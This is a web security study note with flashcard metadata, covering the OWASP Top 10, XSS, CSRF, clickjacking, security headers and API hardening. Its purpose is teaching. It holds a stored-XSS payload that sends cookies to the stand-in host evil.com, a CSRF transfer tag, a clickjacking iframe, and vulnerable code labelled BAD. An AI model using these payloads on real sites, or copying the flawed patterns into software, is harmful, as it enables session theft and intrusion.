---
id: cs-sec-web
title: Security - Web Application Security
topic: security
difficulty: hard
tags:
- cs_security
- web_security
- owasp
anki_cards:
- slug: cs-sec-web-0-en
  language: en
  anki_id: 1769160673825
  synced_at: '2026-01-23T13:31:18.765818'
- slug: cs-sec-web-0-ru
  language: ru
  anki_id: 1769160673850
  synced_at: '2026-01-23T13:31:18.767155'
- slug: cs-sec-web-1-en
  language: en
  anki_id: 1769160673874
  synced_at: '2026-01-23T13:31:18.768405'
- slug: cs-sec-web-1-ru
  language: ru
  anki_id: 1769160673899
  synced_at: '2026-01-23T13:31:18.769599'
- slug: cs-sec-web-2-en
  language: en
  anki_id: 1769160673925
  synced_at: '2026-01-23T13:31:18.772792'
- slug: cs-sec-web-2-ru
  language: ru
  anki_id: 1769160673950
  synced_at: '2026-01-23T13:31:18.780023'
---
# Web Application Security

## OWASP Top 10

### 1. Broken Access Control

Unauthorized access to resources.

**Examples**:
- Accessing other users' data by changing ID
- Bypassing authorization checks
- Privilege escalation

**Prevention**:
```python
# Check ownership
def get_document(doc_id, user):
    doc = Document.get(doc_id)
    if doc.owner_id != user.id:
        raise Forbidden()
    return doc
```

### 2. Cryptographic Failures

Exposure of sensitive data.

**Examples**:
- Transmitting data over HTTP
- Weak encryption algorithms
- Storing passwords in plaintext

**Prevention**:
- Use HTTPS everywhere
- Strong encryption (AES-256, RSA-2048+)
- Proper password hashing (bcrypt, Argon2)

### 3. Injection

Untrusted data sent to interpreter.

**SQL Injection**:
```python
# BAD
query = f"SELECT * FROM users WHERE id = {user_input}"

# GOOD - Parameterized query
cursor.execute("SELECT * FROM users WHERE id = ?", (user_input,))
```

**Command Injection**:
```python
# BAD
os.system(f"ping {user_input}")

# GOOD - Avoid shell, validate input
subprocess.run(["ping", validated_host], shell=False)
```

### 4. Insecure Design

Flaws in design, not implementation.

**Prevention**:
- Threat modeling
- Security requirements from start
- Defense in depth

### 5. Security Misconfiguration

Default or incorrect settings.

**Examples**:
- Default credentials
- Unnecessary features enabled
- Verbose error messages
- Missing security headers

**Prevention**:
```
# Security headers
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000
```

### 6. Vulnerable Components

Using libraries with known vulnerabilities.

**Prevention**:
- Keep dependencies updated
- Use vulnerability scanners (npm audit, Snyk)
- Remove unused dependencies

### 7. Identification and Authentication Failures

Weak authentication mechanisms.

**Prevention**:
- Strong password requirements
- MFA
- Rate limiting
- Secure session management

### 8. Software and Data Integrity Failures

Unverified updates, CI/CD compromise.

**Prevention**:
- Verify signatures
- Secure CI/CD pipeline
- Use integrity checks (SRI for scripts)

### 9. Security Logging and Monitoring Failures

Insufficient logging for detection.

**Log**:
- Authentication events
- Access control failures
- Input validation failures
- Sensitive operations

### 10. Server-Side Request Forgery (SSRF)

Server makes requests to unintended locations.

```python
# BAD - User controls URL
response = requests.get(user_provided_url)

# GOOD - Whitelist allowed domains
if urlparse(url).netloc not in ALLOWED_HOSTS:
    raise Forbidden()
```

## Cross-Site Scripting (XSS)

Injecting malicious scripts into web pages.

### Types

**Reflected XSS**: Script in URL, reflected in response.
```
https://example.com/search?q=<script>alert('XSS')</script>
```

**Stored XSS**: Script stored in database, shown to users.
```
Comment: <script>document.location='evil.com?c='+document.cookie</script>
```

**DOM-based XSS**: Client-side JavaScript vulnerability.
```javascript
// BAD
document.innerHTML = location.hash.substring(1);
```

### Prevention

1. **Output encoding**:
```python
# HTML context
html.escape(user_input)

# JavaScript context
json.dumps(user_input)
```

2. **Content Security Policy**:
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

3. **HttpOnly cookies**: Prevent JavaScript access.

4. **Input validation**: Whitelist allowed characters.

## Cross-Site Request Forgery (CSRF)

Trick user into making unintended requests.

**Attack**:
```html
<!-- On evil.com -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```

**Prevention**:

1. **CSRF tokens**:
```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="random_token">
</form>
```

2. **SameSite cookies**:
```
Set-Cookie: session=abc; SameSite=Strict
```

3. **Check Origin/Referer header**.

## Clickjacking

Trick user into clicking hidden elements.

**Attack**:
```html
<iframe src="https://bank.com/transfer" style="opacity:0"></iframe>
<button>Click for prize!</button>
```

**Prevention**:
```
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

## Security Headers

```
# Prevent MIME sniffing
X-Content-Type-Options: nosniff

# Prevent clickjacking
X-Frame-Options: DENY

# Enable XSS filter (legacy)
X-XSS-Protection: 1; mode=block

# Force HTTPS
Strict-Transport-Security: max-age=31536000; includeSubDomains

# Control resources
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com

# Control referrer
Referrer-Policy: strict-origin-when-cross-origin

# Control features
Permissions-Policy: geolocation=(), camera=()
```

## API Security

### Rate Limiting

```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@app.route("/api/login")
@limiter.limit("5 per minute")
def login():
    ...
```

### Input Validation

```python
from pydantic import BaseModel, EmailStr

class UserCreate(BaseModel):
    email: EmailStr
    password: str
    age: int = Field(ge=0, le=150)
```

### API Keys

```
# In header
Authorization: Bearer <api_key>

# Or
X-API-Key: <api_key>
```

**Best practices**:
- Use HTTPS
- Rate limit by key
- Scope permissions
- Rotate regularly

## Secure Development

### Defense in Depth

Multiple layers of security.

```
Internet -> WAF -> Load Balancer -> App Server -> Database
              ^         ^              ^            ^
           Layer 1   Layer 2       Layer 3      Layer 4
```

### Principle of Least Privilege

Grant minimum necessary permissions.

```python
# Database user with limited permissions
db_user: SELECT, INSERT on app_tables
# Not: ALL PRIVILEGES
```

### Security Testing

| Type | When | Examples |
|------|------|----------|
| SAST | Development | SonarQube, Semgrep |
| DAST | Testing | OWASP ZAP, Burp Suite |
| Dependency scan | CI/CD | npm audit, Snyk |
| Penetration testing | Pre-release | Manual testing |

## Interview Questions

1. **What is XSS and how to prevent it?**
   - Injecting scripts into web pages
   - Prevention: Output encoding, CSP, HttpOnly cookies

2. **What is CSRF and how to prevent it?**
   - Trick user into making unintended requests
   - Prevention: CSRF tokens, SameSite cookies

3. **How to prevent SQL injection?**
   - Use parameterized queries
   - Never concatenate user input into SQL
   - Use ORM

4. **What security headers should you set?**
   - HSTS for HTTPS
   - CSP for resource control
   - X-Frame-Options for clickjacking
   - X-Content-Type-Options for MIME sniffing
